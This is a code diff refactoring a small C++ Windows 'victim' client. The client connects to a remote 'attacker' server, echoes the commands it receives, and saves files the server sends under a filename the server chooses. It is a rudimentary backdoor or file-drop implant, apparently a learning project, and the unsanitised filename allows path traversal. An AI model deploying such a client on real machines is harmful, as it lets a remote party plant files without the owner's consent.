@@ -3,14 +3,11 @@
 #include <ws2tcpip.h>
 #include <cstdint>
 #include "menu.h"
-
-#define PORT 4444
-#define BUFFERSIZE 4096
-#define SERVER_STATUS_CLOSED "Connection closed by server"
+#include <direct.h>
 
 int main(int argc, char* argv[]) {
     if(argc < 2) {
-        std::cout << "Please type: ./victim [IP]\n";
+        std::cout << ARGV_ERROR << std::endl;
         return 1;
     }
     sockaddr_in serverAddress;
@@ -19,19 +16,19 @@ int main(int argc, char* argv[]) {
     SOCKET sock = INVALID_SOCKET;
 
     if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //ver 2.2
-        perror("WSAStartup failed\n");
+        perror(WSA_FAIL);
         return 1;
     } else {
-        std::cout << "WSAStartup created\n";
+        std::cout << WSA_SUCCESS;
     }
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock == INVALID_SOCKET) {
-        perror("Socket failed to create\n");
+        perror(SOCKET_FAIL);
         WSACleanup();
         return 1;
     } else {
-        std::cout << "Socket created\n";
+        std::cout << SOCKET_SUCCESS;
     }
 
     serverAddress.sin_family = AF_INET;
@@ -40,17 +37,17 @@ int main(int argc, char* argv[]) {
     std::string serverip = argv[1];
 
     if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
-        std::cout << "Invalid ip address\n";
+        std::cout << INVALID_IP;
         return 1;
     }
 
     if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
-        std::cout << "Connection failed\n";
+        std::cout << CONNECTION_FAIL;
         closesocket(sock);
         WSACleanup();
         return 1;
     } else {
-        std::cout << "Connection established\n";
+        std::cout << CONNECTION_ESTABLISHED;
     }
 
     while(true) {
@@ -61,7 +58,7 @@ int main(int argc, char* argv[]) {
             break;
         }
 
-        if(type == 1) {
+        if(type == TYPE_TEXT) {
             memset(buffer, 0, BUFFERSIZE);
 
             bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
@@ -70,47 +67,43 @@ int main(int argc, char* argv[]) {
                 break;
             }
             std::string cmd(buffer);
-            std::cout << "Attacker: " << cmd << std::endl;
+            std::cout << ATTACKER_LABEL << cmd << std::endl;
 
             std::string clientMessage = "Client received: " + cmd + '\n';
             send(sock, clientMessage.c_str(), clientMessage.size(), 0);
         
         }
         
-        if(type == 2) {
+        if(type == TYPE_FILE) {
             int64_t fileSize;
             bytesRec = recv(sock, (char*)&fileSize, sizeof(fileSize), 0);
-            std::cout << "Received fileSize of bytes" << bytesRec << ", with a fileSize of " << fileSize << std::endl;
             if(bytesRec < 0 || fileSize < 0) {
-                std::cout << "Cannot receive file information\n";
+                std::cout << FILE_INFORMATION_FAIL;
                 continue;
             }
 
             int32_t fileNameLeng;
             bytesRec = recv(sock, (char*)&fileNameLeng, sizeof(fileNameLeng), 0);
-                std::cout << "Received nameLength of bytes " << bytesRec << ", and nameLength is " << fileNameLeng << std::endl;
             if (bytesRec <= 0) {
-                std::cout << "Cannot retrieve file name length\n";
+                std::cout << FILE_NAME_FAIL;
                 continue;
             }
 
             char* fileNameBuffer = new char[fileNameLeng + 1];
             bytesRec = recv(sock, fileNameBuffer, fileNameLeng, 0);
-            std::cout << "Received filename of bytes " << bytesRec << std::endl;
             fileNameBuffer[fileNameLeng] = '\0';
             std::string filename(fileNameBuffer);
             delete[] fileNameBuffer;
 
-            std::cout << "The Filename is '" << filename << "', and Length is " << filename.length() << std::endl;
-
-            std::string path = filename;
-
-            std::cout << "File: " << filename << " has " << fileSize << " bytes\n";
-            std::cout << "Saving the file to " << filename << std::endl;
+            char c[BUFFERSIZE];
+            _getcwd(c, sizeof(c));
+            std::string path = std::string(c) + "\\" + filename;
+            std::cout << RECEIVED_FILE << filename << std::endl;
+            std::cout << SAVING_FILE << path << std::endl;
 
             FILE* fileOutput = fopen(path.c_str(), "wb");
             if(!fileOutput) {
-                std::cout << "Cannot create file\n";
+                std::cout << "\033[31mCannot create file\033[0m\n";
                 continue;
             }
         
@@ -126,10 +119,9 @@ int main(int argc, char* argv[]) {
             }
 
             fclose(fileOutput);
-            std::cout << "File received: " << filename << std::endl;
         }
 
-        if(type == 3) {
+        if(type == TYPE_EXIT) {
             std::cout << SERVER_STATUS_CLOSED;
             break;
         }
